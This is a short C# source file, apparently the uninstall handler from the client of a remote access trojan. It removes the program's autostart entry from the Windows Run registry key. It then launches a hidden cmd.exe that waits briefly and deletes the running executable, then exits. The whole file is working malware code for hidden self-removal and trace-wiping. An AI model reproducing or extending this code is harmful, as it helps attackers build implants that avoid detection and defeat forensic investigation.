using Client.Helper;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;

namespace Client.Handle_Packet
{
   public class HandleUninstall
    {
        public HandleUninstall()
        {
                if (Convert.ToBoolean(Settings.Install))
                {
                    try
                    {
                        Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run\").DeleteValue(Path.GetFileName(Settings.ClientFullPath));
                    }
                    catch { }
                }
                ProcessStartInfo Del = null;
                try
                {
                    Del = new ProcessStartInfo()
                    {
                        Arguments = "/C choice /C Y /N /D Y /T 1 & Del \"" + Process.GetCurrentProcess().MainModule.FileName + "\"",
                        WindowStyle = ProcessWindowStyle.Hidden,
                        CreateNoWindow = true,
                        FileName = "cmd.exe"
                    };
                }
                catch { }
                finally
                {
                    Methods.CloseMutex();
                    Process.Start(Del);
                    Environment.Exit(0);
                }
        }
    }
}
